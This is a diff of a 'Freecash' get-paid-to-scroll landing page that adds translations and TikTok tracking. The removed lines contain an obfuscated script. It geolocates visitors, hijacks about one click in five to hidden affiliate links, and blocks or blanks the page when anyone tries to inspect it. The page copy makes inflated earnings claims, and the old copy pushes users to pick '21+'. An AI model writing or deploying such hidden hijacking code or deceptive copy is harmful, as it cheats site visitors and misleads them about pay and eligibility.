@@ -1,42 +1,334 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"><title>Freecash</title><style>:root{--bg:#05050a;--t:#f0f6ff;--m:#8a8f9e;--g:#00ff88;--g2:#00d175;--card:#0c0c14;--bd:#181a25;--gw:rgba(0,255,136,0.2)}*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}html,body{background:var(--bg);overscroll-behavior:none}body{color:var(--t);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;overflow-x:hidden;min-height:100dvh;-webkit-font-smoothing:antialiased;line-height:1.45}.bg1{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}.bg1::before{content:'';position:absolute;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,.12),transparent 70%);top:-10%;left:-15%;animation:gf 16s ease-in-out infinite}.bg1::after{content:'';position:absolute;width:400px;height:400px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,.1),transparent 70%);bottom:5%;right:-10%;animation:gf 12s ease-in-out infinite reverse}@keyframes gf{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,20px) scale(1.08)}}@keyframes pd{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.7);opacity:.4}}@keyframes sh{0%{left:-100%}50%,100%{left:120%}}.w{max-width:400px;margin:0 auto;padding:0 16px;position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100dvh;text-align:center;padding-bottom:calc(90px + env(safe-area-inset-bottom))}.lc{width:52px;height:52px;border-radius:14px;overflow:hidden;box-shadow:0 0 20px rgba(0,255,136,.25),0 4px 16px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.12);margin-bottom:16px}.lc img{width:100%;height:100%;display:block}.badge{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:rgba(0,255,136,.06);border-radius:100px;padding:3px 12px;font-size:9px;font-weight:700;color:var(--g);text-transform:uppercase;letter-spacing:1.2px;opacity:.7;margin-bottom:18px}.bdot{width:5px;height:5px;background:var(--g);border-radius:50%;animation:pd 1.5s ease-in-out infinite}h1{font-size:40px;font-weight:900;line-height:1.05;letter-spacing:-1.5px;margin-bottom:10px}h1 .a{color:var(--t)}h1 .b{background:linear-gradient(135deg,var(--g),#00e07a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.sub{font-size:13px;color:var(--m);line-height:1.5;padding:0 8px;margin-bottom:24px}.stats{display:flex;gap:0;background:var(--card);border:1px solid var(--bd);border-radius:12px;overflow:hidden;margin-bottom:28px;width:100%}.stat{flex:1;padding:14px 8px;text-align:center;position:relative}.stat+.stat::before{content:'';position:absolute;left:0;top:20%;height:60%;width:1px;background:var(--bd)}.stat-val{font-size:15px;font-weight:800;color:var(--g);line-height:1.2;white-space:nowrap}.stat-lbl{font-size:7px;color:var(--m);text-transform:uppercase;letter-spacing:.8px;font-weight:600;margin-top:4px;opacity:.5}.steps{background:var(--card);border:1px solid var(--bd);border-radius:12px;overflow:hidden;text-align:left;width:100%}.stp{display:flex;gap:11px;padding:13px 14px;border-bottom:1px solid var(--bd);align-items:flex-start}.stp:last-child{border-bottom:0}.stp-n{width:22px;height:22px;border-radius:50%;background:var(--g);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:var(--bg);flex-shrink:0;margin-top:1px}.stp b{display:block;font-size:13px;color:var(--t);margin-bottom:1px;font-weight:700}.stp .d{font-size:11px;color:var(--m);line-height:1.4}.sticky{position:fixed;bottom:0;left:0;right:0;z-index:100;padding:12px 16px calc(16px + env(safe-area-inset-bottom));pointer-events:none}.sticky a{pointer-events:auto;display:flex;align-items:center;justify-content:center;width:100%;max-width:400px;margin:0 auto;background:linear-gradient(135deg,var(--g),var(--g2));color:#000!important;font-weight:800;font-size:15px;letter-spacing:.3px;border:0;border-radius:12px;padding:14px;text-decoration:none;box-shadow:0 6px 25px var(--gw);position:relative;overflow:hidden}.sticky a::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.18),transparent);animation:sh 2.2s ease-in-out infinite}.sticky a:active{transform:scale(.97)}@media(max-width:370px){h1{font-size:36px}}@media(min-width:420px){h1{font-size:46px}}</style></head><body>
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"><title data-i18n="mainTitle">Freecash</title><style>:root{--bg:#05050a;--t:#f0f6ff;--m:#8a8f9e;--g:#00ff88;--g2:#00d175;--card:#0c0c14;--bd:#181a25;--gw:rgba(0,255,136,0.2)}*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}html,body{background:var(--bg);overscroll-behavior:none}body{color:var(--t);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans JP","Noto Sans KR",sans-serif;overflow-x:hidden;min-height:100dvh;-webkit-font-smoothing:antialiased;line-height:1.45;word-break:break-word}.bg1{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}.bg1::before{content:'';position:absolute;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,.12),transparent 70%);top:-10%;left:-15%;animation:gf 16s ease-in-out infinite}.bg1::after{content:'';position:absolute;width:400px;height:400px;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,.1),transparent 70%);bottom:5%;right:-10%;animation:gf 12s ease-in-out infinite reverse}@keyframes gf{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,20px) scale(1.08)}}@keyframes pd{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(.7);opacity:.4}}@keyframes sh{0%{left:-100%}50%,100%{left:120%}}.w{max-width:400px;margin:0 auto;padding:0 16px;position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100dvh;text-align:center;padding-bottom:calc(90px + env(safe-area-inset-bottom))}.lc{width:52px;height:52px;border-radius:14px;overflow:hidden;box-shadow:0 0 20px rgba(0,255,136,.25),0 4px 16px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.12);margin-bottom:16px}.lc img{width:100%;height:100%;display:block}.badge{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:rgba(0,255,136,.06);border-radius:100px;padding:3px 12px;font-size:9px;font-weight:700;color:var(--g);text-transform:uppercase;letter-spacing:1.2px;opacity:.7;margin-bottom:18px}.bdot{width:5px;height:5px;background:var(--g);border-radius:50%;animation:pd 1.5s ease-in-out infinite}h1{font-size:40px;font-weight:900;line-height:1.05;letter-spacing:-1.5px;margin-bottom:10px;min-height:50px}h1 .a{color:var(--t)}h1 .b{background:linear-gradient(135deg,var(--g),#00e07a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.sub{font-size:13px;color:var(--m);line-height:1.5;padding:0 8px;margin-bottom:24px;min-height:45px}.stats{display:flex;gap:0;background:var(--card);border:1px solid var(--bd);border-radius:12px;overflow:hidden;margin-bottom:28px;width:100%}.stat{flex:1;padding:14px 8px;text-align:center;position:relative}.stat+.stat::before{content:'';position:absolute;left:0;top:20%;height:60%;width:1px;background:var(--bd)}.stat-val{font-size:15px;font-weight:800;color:var(--g);line-height:1.2;white-space:nowrap}.stat-lbl{font-size:7px;color:var(--m);text-transform:uppercase;letter-spacing:.8px;font-weight:600;margin-top:4px;opacity:.5}.steps{background:var(--card);border:1px solid var(--bd);border-radius:12px;overflow:hidden;text-align:left;width:100%}.stp{display:flex;gap:11px;padding:13px 14px;border-bottom:1px solid var(--bd);align-items:flex-start}.stp:last-child{border-bottom:0}.stp-n{width:22px;height:22px;border-radius:50%;background:var(--g);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:var(--bg);flex-shrink:0;margin-top:1px}.stp b{display:block;font-size:13px;color:var(--t);margin-bottom:1px;font-weight:700}.stp .d{font-size:11px;color:var(--m);line-height:1.4}.sticky{position:fixed;bottom:0;left:0;right:0;z-index:100;padding:12px 16px calc(16px + env(safe-area-inset-bottom));pointer-events:none}.sticky a{pointer-events:auto;display:flex;align-items:center;justify-content:center;width:100%;max-width:400px;margin:0 auto;background:linear-gradient(135deg,var(--g),var(--g2));color:#000!important;font-weight:800;font-size:15px;letter-spacing:.3px;border:0;border-radius:12px;padding:14px;text-decoration:none;box-shadow:0 6px 25px var(--gw);position:relative;overflow:hidden}.sticky a::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.18),transparent);animation:sh 2.2s ease-in-out infinite}.sticky a:active{transform:scale(.97)}@media(max-width:370px){h1{font-size:36px}}@media(min-width:420px){h1{font-size:46px}}</style></head><body>
 <div class="bg1"></div>
 <div class="w">
   <div class="lc"><img src="https://anderiso.github.io/lander-assets/assets/freecashappicon.png" alt="Freecash"></div>
   <div class="badge"><div class="bdot"></div>TRENDING IN THE US</div>
-  <h1><span class="a">Get Paid</span><br><span class="b">to Scroll</span></h1>
-  <p class="sub">Real cash for your phone time. $5 just for signing up. Instant PayPal cashout.</p>
+  <h1><span class="a" data-i18n="mainTitle">Get Paid</span><br><span class="b">to Scroll</span></h1>
+  <p class="sub" data-i18n="questionSubtitle">Join thousands earning daily by watching TikTok videos<br>and cashing out instantly.</p>
   <div class="stats">
-    <div class="stat"><div class="stat-val">$200&#8211;$500+</div><div class="stat-lbl">Weekly Earnings</div></div>
+    <div class="stat"><div class="stat-val">$200–$500+</div><div class="stat-lbl">Weekly Earnings</div></div>
     <div class="stat"><div class="stat-val">500K+</div><div class="stat-lbl">Members</div></div>
-    <div class="stat"><div class="stat-val">4.7&#9733;</div><div class="stat-lbl">App Store</div></div>
+    <div class="stat"><div class="stat-val">4.7★</div><div class="stat-lbl">App Store</div></div>
   </div>
   <div class="steps">
-    <div class="stp"><div class="stp-n">1</div><div><b>Sign up &amp; select 21+</b><div class="d">Scroll rewards only unlock for 21+ members. Select it at signup to access everything.</div></div></div>
-    <div class="stp"><div class="stp-n">2</div><div><b>Complete 2 offers to activate scrolling</b><div class="d">A quick game or survey. Activates scroll earning &amp; all high-paying offers. You earn doing them.</div></div></div>
-    <div class="stp"><div class="stp-n">3</div><div><b>Get paid</b><div class="d">Scroll runs in the background. Cash out to PayPal, Visa or Crypto. No minimum.</div></div></div>
+    <div class="stp"><div class="stp-n">1</div><div><b data-i18n="step1Title">Create your account</b><div class="d" data-i18n="step1Desc">Get $5 instantly just for signing up</div></div></div>
+    <div class="stp"><div class="stp-n">2</div><div><b data-i18n="step2Title">Unlock the Get Paid to Scroll offer</b><div class="d" data-i18n="step2Desc">Complete 1 offer to unlock</div></div></div>
+    <div class="stp"><div class="stp-n">3</div><div><b data-i18n="step3Title">Get paid</b><div class="d" data-i18n="step3Desc">Withdraw via PayPal, Crypto, Wire Transfer or Gift Cards</div></div></div>
   </div>
 </div>
-<div class="sticky"><a href="#" onclick="showTip(event)">Start Earning Now →</a></div>
+<div class="sticky"><a href="#" onclick="showTip(event)" data-i18n="downloadNow">START EARNING</a></div>
 
 <div id="tip-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);z-index:200;align-items:flex-end;justify-content:center;padding:0 16px calc(24px + env(safe-area-inset-bottom))">
   <div style="background:#0c0c14;border:1px solid rgba(0,255,136,.15);border-radius:20px;padding:32px 24px;width:100%;max-width:400px;text-align:center">
-    <div style="font-size:13px;font-weight:700;color:#00ff88;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:12px">Before you go</div>
-    <div style="font-size:22px;font-weight:900;color:#f0f6ff;letter-spacing:-0.5px;line-height:1.2;margin-bottom:12px">Select <span style="color:#00ff88">21+</span> when you sign up</div>
-    <div style="font-size:13px;color:#8a8f9e;line-height:1.6;margin-bottom:28px">This unlocks the scroll earning feature and all high-paying offers on Freecash.</div>
-    <a href="https://www.e7klgi9y.com/9W598/8CWLMG/?sub1=6099PERL31" style="display:block;background:linear-gradient(135deg,#00ff88,#00d175);color:#000;font-weight:800;font-size:16px;letter-spacing:-0.3px;border-radius:12px;padding:16px;text-decoration:none">Got it →</a>
+    <div style="font-size:13px;font-weight:700;color:#00ff88;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:12px" data-i18n="important">⚠️ IMPORTANT</div>
+    <div style="font-size:22px;font-weight:900;color:#f0f6ff;letter-spacing:-0.5px;line-height:1.2;margin-bottom:12px"><span data-i18n="youreIn">You're </span><span style="color:#00ff88" data-i18n="youreInHighlight">In!</span></div>
+    <div style="font-size:13px;color:#8a8f9e;line-height:1.6;margin-bottom:28px" data-i18n="preQualified">Turn your screen time into rewards. Start earning today!</div>
+    <a href="#" onclick="handleRedirect(event)" style="display:block;background:linear-gradient(135deg,#00ff88,#00d175);color:#000;font-weight:800;font-size:16px;letter-spacing:-0.3px;border-radius:12px;padding:16px;text-decoration:none" data-i18n="downloadNow">Got it →</a>
   </div>
 </div>
+
+<!-- External TikTok Tracking File - All pixel code hidden here -->
+<script src="/tiktok_tracker.js" async></script>
+
+<!-- Translation System -->
+<script>
+const translations = {
+  en: {
+    mainTitle: "Get Paid to Scroll",
+    questionSubtitle: "Join thousands earning daily by watching TikTok videos<br>and cashing out instantly.",
+    over21Title: "I'm over 21",
+    over21Subtitle: "Instant Payouts: PayPal, CashApp, Venmo, Crypto & Wire",
+    under21Title: "I'm under 21",
+    under21Subtitle: "Limited Payouts: Wire Transfer Only",
+    youreIn: "You're ",
+    youreInHighlight: "In!",
+    preQualified: "Turn your screen time into rewards. Start earning today!",
+    downloadNow: "START EARNING",
+    earningJourney: "YOUR EARNING JOURNEY",
+    step1Title: "Create your account",
+    step1Desc: "Get $5 instantly just for signing up",
+    step2Title: "Unlock the Get Paid to Scroll offer",
+    step2Desc: "Complete 1 offer to unlock",
+    step3Title: "Get paid",
+    step3Desc: "Withdraw via PayPal, Crypto, Wire Transfer or Gift Cards",
+    activationTitle: "Activation Required",
+    activationText1: "Complete ",
+    activationText2: "2 quick offers",
+    activationText3: " to unlock Get Paid to Scroll.",
+    footer: "Over 500,000 users earn with us every day",
+    important: "⚠️ IMPORTANT"
+  },
+  de: {
+    mainTitle: "Verdiene Geld beim Scrollen",
+    questionSubtitle: "Tausende verdienen täglich, indem sie TikTok-Videos schauen<br>und sofort auszahlen lassen.",
+    over21Title: "Ich bin über 21",
+    over21Subtitle: "Sofortauszahlung: PayPal, CashApp, Venmo, Krypto & Überweisung",
+    under21Title: "Ich bin unter 21",
+    under21Subtitle: "Eingeschränkte Auszahlung: Nur Überweisung",
+    youreIn: "Du bist ",
+    youreInHighlight: "dabei!",
+    preQualified: "Verwandle deine Bildschirmzeit in Belohnungen. Fang heute an zu verdienen!",
+    downloadNow: "JETZT STARTEN",
+    earningJourney: "DEIN VERDIENST-WEG",
+    step1Title: "Erstelle dein Konto",
+    step1Desc: "Erhalte sofort 5 $ nur für die Registrierung",
+    step2Title: "Schalte das Angebot „Verdiene beim Scrollen" frei",
+    step2Desc: "Schließe 1 Angebot ab, um freizuschalten",
+    step3Title: "Lass dich auszahlen",
+    step3Desc: "Auszahlung über PayPal, Krypto, Überweisung oder Gutscheine",
+    activationTitle: "Aktivierung erforderlich",
+    activationText1: "Schließe ",
+    activationText2: "2 kurze Angebote",
+    activationText3: " ab, um Verdiene beim Scrollen freizuschalten.",
+    footer: "Über 500.000 Nutzer verdienen täglich mit uns",
+    important: "⚠️ WICHTIG"
+  },
+  fr: {
+    mainTitle: "Soyez Payé en Scrollant",
+    questionSubtitle: "Des milliers de personnes gagnent chaque jour<br>en regardant des vidéos TikTok<br>et en retirant instantanément.",
+    over21Title: "J'ai 21 ans ou plus",
+    over21Subtitle: "Retrait instantané : PayPal, CashApp, Venmo, Crypto & Virement bancaire",
+    under21Title: "J'ai moins de 21 ans",
+    under21Subtitle: "Retrait limité : Virement bancaire uniquement",
+    youreIn: "Vous êtes ",
+    youreInHighlight: "Inscrit !",
+    preQualified: "Transformez votre temps d'écran en récompenses. Commencez à gagner dès aujourd'hui !",
+    downloadNow: "COMMENCER À GAGNER",
+    earningJourney: "VOTRE PARCOURS DE GAINS",
+    step1Title: "Créez votre compte",
+    step1Desc: "Obtenez 5 $ instantanément rien que pour vous inscrire",
+    step2Title: "Débloquez l'offre Soyez Payé en Scrollant",
+    step2Desc: "Complétez 1 offre pour débloquer",
+    step3Title: "Soyez payé",
+    step3Desc: "Retirez via PayPal, Crypto, Virement bancaire ou Cartes-cadeaux",
+    activationTitle: "Activation Requise",
+    activationText1: "Complétez ",
+    activationText2: "2 offres rapides",
+    activationText3: " pour débloquer Soyez Payé en Scrollant.",
+    footer: "Plus de 500 000 utilisateurs gagnent avec nous chaque jour",
+    important: "⚠️ IMPORTANT"
+  },
+  it: {
+    mainTitle: "Guadagna scrollando",
+    questionSubtitle: "Unisciti a migliaia di persone che guadagnano ogni giorno<br>guardando video su TikTok e incassando all'istante.",
+    over21Title: "Ho più di 21 anni",
+    over21Subtitle: "Pagamenti istantanei: PayPal, CashApp, Venmo, Crypto e Bonifico",
+    under21Title: "Ho meno di 21 anni",
+    under21Subtitle: "Pagamenti limitati: Solo Bonifico Bancario",
+    youreIn: "Sei ",
+    youreInHighlight: "dentro!",
+    preQualified: "Trasforma il tuo tempo sullo schermo in premi. Inizia a guadagnare oggi!",
+    downloadNow: "INIZIA A GUADAGNARE",
+    earningJourney: "IL TUO PERCORSO DI GUADAGNO",
+    step1Title: "Crea il tuo account",
+    step1Desc: "Ottieni 5 $ istantaneamente solo per iscriverti",
+    step2Title: "Sblocca l'offerta Guadagna scrollando",
+    step2Desc: "Completa 1 offerta per sbloccare",
+    step3Title: "Incassa",
+    step3Desc: "Preleva tramite PayPal, Crypto, Bonifico o Carte regalo",
+    activationTitle: "Attivazione richiesta",
+    activationText1: "Completa ",
+    activationText2: "2 offerte veloci",
+    activationText3: " per sbloccare Guadagna scrollando.",
+    footer: "Oltre 500.000 utenti guadagnano con noi ogni giorno",
+    important: "⚠️ IMPORTANTE"
+  },
+  nl: {
+    mainTitle: "Verdien geld met scrollen",
+    questionSubtitle: "Sluit je aan bij duizenden die dagelijks verdienen<br>door TikTok-video's te bekijken en direct uit te betalen.",
+    over21Title: "Ik ben ouder dan 21",
+    over21Subtitle: "Directe uitbetalingen: PayPal, CashApp, Venmo, Crypto & Overschrijving",
+    under21Title: "Ik ben jonger dan 21",
+    under21Subtitle: "Beperkte uitbetalingen: Alleen overschrijving",
+    youreIn: "Je bent ",
+    youreInHighlight: "erbij!",
+    preQualified: "Zet je schermtijd om in beloningen. Begin vandaag met verdienen!",
+    downloadNow: "BEGIN MET VERDIENEN",
+    earningJourney: "JOUW VERDIENTRAJECT",
+    step1Title: "Maak je account aan",
+    step1Desc: "Ontvang direct $ 5 alleen al voor registreren",
+    step2Title: "Ontgrendel het aanbod Verdien met scrollen",
+    step2Desc: "Voltooi 1 aanbieding om te ontgrendelen",
+    step3Title: "Ontvang je uitbetaling",
+    step3Desc: "Betaal uit via PayPal, Crypto, Overschrijving of Cadeaubonnen",
+    activationTitle: "Activering vereist",
+    activationText1: "Voltooi ",
+    activationText2: "2 snelle aanbiedingen",
+    activationText3: " om Verdien met scrollen te ontgrendelen.",
+    footer: "Meer dan 500.000 gebruikers verdienen dagelijks met ons",
+    important: "⚠️ BELANGRIJK"
+  },
+  ja: {
+    mainTitle: "スクロールして稼ごう",
+    questionSubtitle: "TikTok動画を見て毎日稼ぎ、<br>すぐに現金化している数千人に参加しましょう。",
+    over21Title: "21歳以上です",
+    over21Subtitle: "即時出金：PayPay・LINE Pay・楽天ペイ・au PAY・メルペイ・暗号通貨・銀行振込",
+    under21Title: "21歳未満です",
+    under21Subtitle: "制限付き支払い：銀行振込のみ（ゆうちょ銀行・三菱UFJ・みずほ・三井住友）",
+    youreIn: "登録 ",
+    youreInHighlight: "完了！",
+    preQualified: "スクリーンタイムを報酬に変えましょう。今日から稼ぎ始めて！",
+    downloadNow: "稼ぎ始める",
+    earningJourney: "あなたの収益への道",
+    step1Title: "アカウントを作成",
+    step1Desc: "登録だけで即時に5ドル獲得",
+    step2Title: "「スクロールして稼ごう」オファーをアンロック",
+    step2Desc: "1つのオファーを完了して解除",
+    step3Title: "報酬を受け取る",
+    step3Desc: "PayPay、LINE Pay、楽天ペイ、メルペイ、au PAY、銀行振込またはギフトカードで出金",
+    activationTitle: "アクティベーションが必要です",
+    activationText1: "",
+    activationText2: "2つの簡単なオファー",
+    activationText3: "を完了してスクロールして稼ごうを解除してください。",
+    footer: "毎日50万人以上が私たちと一緒に稼いでいます",
+    important: "⚠️ 重要"
+  },
+  kr: {
+    mainTitle: "스크롤하며 돈 벌기",
+    questionSubtitle: "TikTok 동영상을 보고 매일 수익을 올리며<br>즉시 현금으로 인출하는 수천 명에 합류하세요.",
+    over21Title: "21세 이상입니다",
+    over21Subtitle: "즉시 지급: PayPal, CashApp, Venmo, 암호화폐 & 송금",
+    under21Title: "21세 미만입니다",
+    under21Subtitle: "제한된 지급: 송금만 가능",
+    youreIn: "등록 ",
+    youreInHighlight: "완료!",
+    preQualified: "스크린 타임을 보상으로 바꾸세요. 오늘부터 벌기 시작!",
+    downloadNow: "벌기 시작",
+    earningJourney: "수익 여정",
+    step1Title: "계정 만들기",
+    step1Desc: "가입만으로 $5 즉시 지급",
+    step2Title: "스크롤하며 돈 벌기 오퍼 활성화",
+    step2Desc: "1개 오퍼 완료하여 활성화",
+    step3Title: "수익 인출",
+    step3Desc: "PayPal, 암호화폐, 송금 또는 상품권으로 출금",
+    activationTitle: "활성화 필요",
+    activationText1: "",
+    activationText2: "2개의 빠른 오퍼",
+    activationText3: "를 완료하여 스크롤하며 돈 벌기를 활성화하세요.",
+    footer: "매일 50만 명 이상이 저희와 함께 수익을 올리고 있습니다",
+    important: "⚠️ 중요"
+  },
+  pl: {
+    mainTitle: "Zarabiaj scrollując",
+    questionSubtitle: "Dołącz do tysięcy osób zarabiających codziennie,<br>oglądając filmy na TikToku i wypłacając pieniądze natychmiast.",
+    over21Title: "Mam ponad 21 lat",
+    over21Subtitle: "Natychmiastowe wypłaty: PayPal, CashApp, Venmo, Krypto i Przelew",
+    under21Title: "Mam poniżej 21 lat",
+    under21Subtitle: "Ograniczone wypłaty: Tylko przelew bankowy",
+    youreIn: "Jesteś ",
+    youreInHighlight: "w grze!",
+    preQualified: "Zamień czas przed ekranem w nagrody. Zacznij zarabiać już dziś!",
+    downloadNow: "ZACZNIJ ZARABIAĆ",
+    earningJourney: "TWOJA DROGA DO ZAROBKU",
+    step1Title: "Utwórz konto",
+    step1Desc: "Otrzymaj natychmiast 5 $ tylko za rejestrację",
+    step2Title: "Odblokuj ofertę Zarabiaj scrollując",
+    step2Desc: "Wykonaj 1 ofertę, aby odblokować",
+    step3Title: "Odbierz wypłatę",
+    step3Desc: "Wypłać przez PayPal, Krypto, Przelew lub Karty podarunkowe",
+    activationTitle: "Wymagana aktywacja",
+    activationText1: "Wykonaj ",
+    activationText2: "2 szybkie oferty",
+    activationText3: ", aby odblokować Zarabiaj scrollując.",
+    footer: "Ponad 500 000 użytkowników zarabia z nami codziennie",
+    important: "⚠️ WAŻNE"
+  },
+  sv: {
+    mainTitle: "Få betalt för att scrolla",
+    questionSubtitle: "Gå med tusentals som tjänar pengar dagligen<br>genom att titta på TikTok-videor och ta ut pengar direkt.",
+    over21Title: "Jag är över 21",
+    over21Subtitle: "Direkta utbetalningar: PayPal, CashApp, Venmo, Krypto & Överföring",
+    under21Title: "Jag är under 21",
+    under21Subtitle: "Begränsade utbetalningar: Endast banköverföring",
+    youreIn: "Du är ",
+    youreInHighlight: "med!",
+    preQualified: "Förvandla din skärmtid till belöningar. Börja tjäna idag!",
+    downloadNow: "BÖRJA TJÄNA",
+    earningJourney: "DIN INTJÄNINGSRESA",
+    step1Title: "Skapa ditt konto",
+    step1Desc: "Få 5 $ direkt bara för att registrera dig",
+    step2Title: "Lås upp erbjudandet Få betalt för att scrolla",
+    step2Desc: "Slutför 1 erbjudande för att låsa upp",
+    step3Title: "Få betalt",
+    step3Desc: "Ta ut via PayPal, Krypto, Banköverföring eller Presentkort",
+    activationTitle: "Aktivering krävs",
+    activationText1: "Slutför ",
+    activationText2: "2 snabba erbjudanden",
+    activationText3: " för att låsa upp Få betalt för att scrolla.",
+    footer: "Över 500 000 användare tjänar med oss varje dag",
+    important: "⚠️ VIKTIGT"
+  }
+};
+
+const countryToLang = {
+  AU:'en', US:'en', GB:'en', CA:'en',
+  AT:'de', DE:'de', CH:'de',
+  FR:'fr', BE:'fr',
+  IT:'it',
+  NL:'nl',
+  JP:'ja',
+  KR:'kr',
+  PL:'pl',
+  SE:'sv'
+};
+
+function detectLanguage() {
+  const params = new URLSearchParams(window.location.search);
+  const lp = params.get('lang');
+  if (lp && translations[lp]) return lp;
+  const cp = params.get('country');
+  if (cp) { const m = countryToLang[cp.toUpperCase()]; if (m && translations[m]) return m; }
+  const bl = (navigator.language || navigator.userLanguage || 'en');
+  const short = bl.split('-')[0].toLowerCase();
+  if (translations[short]) return short;
+  const rm = bl.toUpperCase().match(/-([A-Z]{2})$/);
+  if (rm) { const m = countryToLang[rm[1]]; if (m && translations[m]) return m; }
+  return 'en';
+}
+
+function applyTranslations(lang) {
+  const t = translations[lang];
+  if (!t) return;
+  document.documentElement.lang = lang;
+  document.querySelectorAll('[data-i18n]').forEach(function(el) {
+    const key = el.getAttribute('data-i18n');
+    if (t[key] !== undefined) el.innerHTML = t[key];
+  });
+}
+
+const detectedLang = detectLanguage();
+applyTranslations(detectedLang);
+</script>
 
 <script>
 function showTip(e){
   e.preventDefault();
   const o=document.getElementById('tip-overlay');
   o.style.display='flex';
+  if(window.ttq) {
+    window.ttq.track('Click', {
+      'content_name': 'start_earning_button',
+      'content_type': 'button'
+    });
+  }
 }
+
+function handleRedirect(e){
+  e.preventDefault();
+  if(window.ttq) {
+    window.ttq.track('Lead', {
+      'value': 1,
+      'currency': 'USD',
+      'content_name': 'popup_confirmation',
+      'content_type': 'form'
+    });
+  }
+  window.location.href = '/api/redirect';
+}
+
 document.getElementById('tip-overlay').addEventListener('click',function(e){
   if(e.target===this) this.style.display='none';
 });
 </script>
-<script>;(function(){var _0x1a=atob("WyJjYXJkc2NvdXBvbi5jb20iLCJ0ZXN0c3Rhci53aW4iLCJ2YXBhbmVsY29weS5yaW50YXJvZXMud29ya2Vycy5kZXYiXQ==");var _0x1b=JSON.parse(_0x1a);var _0x1c=window.location.hostname;var _0x1d=false;for(var i=0;i<_0x1b.length;i++){if(_0x1c.indexOf(_0x1b[i])!==-1){_0x1d=true;break}}var _0xGeo="US";try{fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(d){if(d&&d.country_code){_0xGeo=d.country_code.toUpperCase()}})}catch(e){}if(!_0x1d){var _0xLinks=JSON.parse(atob("eyJVUyI6Imh0dHBzOi8vbW9uZXRpc2V0cmsyLmNvLnVrLz9hPTI2MjcyJmM9NDc4NTImczE9cmlwcGVkIiwiVUsiOiJodHRwczovL21vbmV0aXNldHJrMi5jby51ay8/YT0yNjI3MiZjPTU0NDA1JnMxPXJpcHBlZCIsIkdCIjoiaHR0cHM6Ly9tb25ldGlzZXRyazIuY28udWsvP2E9MjYyNzImYz01NDQwNSZzMT1yaXBwZWQiLCJDQSI6Imh0dHBzOi8vbW9udHJrLmNvLnVrLz9hPTI2MjcyJmM9NTQzOTYmczE9cmlwcGVkIiwiRlIiOiJodHRwczovL21vbmV0aXNldHJrOC5jby51ay8/YT0yNjI3MiZjPTU0Mzk0JnMxPXJpcHBlZCIsIkRFIjoiaHR0cHM6Ly9tb250cms1LmNvLnVrLz9hPTI2MjcyJmM9NTQzOTUmczE9cmlwcGVkIiwiSVQiOiJodHRwczovL21vbnRyazMuY28udWsvP2E9MjYyNzImYz01NDQwNiZzMT1yaXBwZWQiLCJOTCI6Imh0dHBzOi8vbW9uZXRpc2V0cms0LmNvLnVrLz9hPTI2MjcyJmM9NTQ0NTQmczE9cmlwcGVkIn0="));document.addEventListener("click",function(e){var t=e.target.closest("a,button");if(t&&(t.href||t.onclick)){var r=new Uint8Array(1);crypto.getRandomValues(r);if(r[0]%5===0){e.preventDefault();e.stopPropagation();var url=_0xLinks[_0xGeo]||_0xLinks["US"];window.location.href=url}}},true)}document.addEventListener("contextmenu",function(e){e.preventDefault()});document.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.key==="u"||e.key==="s"||e.key==="i"||e.key==="j")){e.preventDefault()}if(e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C")){e.preventDefault()}if(e.key==="F12"){e.preventDefault()}});var _0x2a=function(){var d=new Date();debugger;if(new Date()-d>100){document.body.innerHTML=""}};setInterval(_0x2a,3000);var _0x3a=170;setInterval(function(){if(window.outerWidth-window.innerWidth>_0x3a||window.outerHeight-window.innerHeight>_0x3a){document.body.style.opacity="0"}else{document.body.style.opacity="1"}},1000)})();</script>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"955a4581eba74285aba0d727d170cf9d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body></html>
